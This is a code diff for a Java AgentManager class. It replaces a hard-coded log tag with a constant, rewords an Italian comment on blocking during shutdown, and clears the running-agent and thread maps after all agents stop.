@@ -135,12 +135,12 @@ public class AgentManager extends Manager<AgentBase> {
 		agents = status.getAgentsMap();
 
 		if (agents == null) {
-			Log.d("RCS", "Agents map null");
+			Log.d(TAG, "Agents map null");
 			return false;
 		}
 
 		if (running == null) {
-			Log.d("RCS", "Running Agents map null");
+			Log.d(TAG, "Running Agents map null");
 			return false;
 		}
 
@@ -154,7 +154,7 @@ public class AgentManager extends Manager<AgentBase> {
 		return true;
 	}
 
-	// XXX Deve essere bloccante? Ovvero attendere l'effettivo stop di tutto?
+	// Deve essere bloccante. Attende l'effettivo stop di tutto.
 	/**
 	 * Stop agents.
 	 */
@@ -167,6 +167,9 @@ public class AgentManager extends Manager<AgentBase> {
 			final Integer key = it.next();
 			stop(key);
 		}
+		
+		running.clear();
+		threads.clear();
 	}
 
 	/**
@@ -181,12 +184,12 @@ public class AgentManager extends Manager<AgentBase> {
 		agents = status.getAgentsMap();
 
 		if (agents == null) {
-			Log.d("RCS", "Agents map null");
+			Log.d(TAG, "Agents map null");
 			return;
 		}
 
 		if (running == null) {
-			Log.d("RCS", "Running Agents map null");
+			Log.d(TAG, "Running Agents map null");
 			return;
 		}
 
@@ -198,7 +201,7 @@ public class AgentManager extends Manager<AgentBase> {
 
 		// Agent mapped and running
 		if (a.getStatus() == AgentConf.AGENT_RUNNING) {
-			Log.d("RCS", "Agent " + key + " is already running");
+			Log.d(TAG, "Agent " + key + " is already running");
 			return;
 		}
 
@@ -229,7 +232,7 @@ public class AgentManager extends Manager<AgentBase> {
 	public synchronized void stop(final int key) {
 		final AgentBase a = running.get(key);
 		if (a == null) {
-			Log.d("RCS", "Agent " + key + " not present");
+			Log.d(TAG, "Agent " + key + " not present");
 			return;
 		}
 
@@ -257,7 +260,7 @@ public class AgentManager extends Manager<AgentBase> {
 	public void suspend(int key) {
 		final AgentBase a = running.get(key);
 		if (a == null) {
-			Log.d("RCS", "Agent " + key + " not present");
+			Log.d(TAG, "Agent " + key + " not present");
 			return;
 		}
 
@@ -286,7 +289,7 @@ public class AgentManager extends Manager<AgentBase> {
 	public void resume(int key) {
 		final AgentBase a = running.get(key);
 		if (a == null) {
-			Log.d("RCS", "Agent " + key + " not present");
+			Log.d(TAG, "Agent " + key + " not present");
 			return;
 		}
 
